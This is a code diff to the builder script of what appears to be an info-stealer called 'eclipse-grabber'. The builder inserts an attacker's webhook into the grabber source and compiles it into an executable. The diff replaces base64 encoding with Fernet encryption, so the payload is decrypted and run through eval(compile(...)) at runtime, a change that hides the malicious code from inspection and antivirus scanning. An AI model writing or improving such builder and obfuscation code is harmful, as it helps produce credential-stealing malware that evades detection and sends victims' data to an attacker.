@@ -1,6 +1,6 @@
 from os import remove as delete_file, path
+from cryptography.fernet import Fernet
 from sys import platform as OS
-from base64 import b64encode
 from argparse import ArgumentParser, Namespace
 from subprocess import run, PIPE
 
@@ -17,16 +17,19 @@ TITLE = '''
 
 ECLIPSE_GRABBER_PATH = path.join("code", "eclipse-grabber.py")
 
+KEY = Fernet.generate_key().decode()
 
 def build(webhook: str, out_file: str):
     code_file = open(ECLIPSE_GRABBER_PATH, 'r')
     code = code_file.read()
     code_file.close()
+    index = code.find("WEBHOOK")
+    libs = code[0:index] + "from cryptography.fernet import Fernet\n"
+    content = code[index:-1].replace("{WEBHOOK}", str(webhook))
 
-    libs = code[0:code.find("WEBHOOK")]
-    content = code.replace("{WEBHOOK}", str(webhook))
-    encoded = b64encode(content.encode())
-    eval_code = f"eval(compile(b64decode({encoded}).decode(), '<string>', 'exec'))"
+
+    encrypted_content = Fernet(KEY).encrypt(content.encode())
+    eval_code = f"\ncode = Fernet('{KEY}').decrypt({encrypted_content}).decode();eval(compile(code, '<string>', 'exec'))"
 
     build_file = open(out_file + ".py", 'w')
     build_file.write(libs)
@@ -49,7 +52,7 @@ def build(webhook: str, out_file: str):
         command_result = run(compile_command, stdout=PIPE, stderr=PIPE)
         result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')
         if "completed successfully" not in result:
-            raise Exception(result.splitlines()[-2])
+            raise Exception(result)  # result.splitlines()[-2]
     except Exception as error:
         exit(f"\n[-] Build Error: {error}")
 
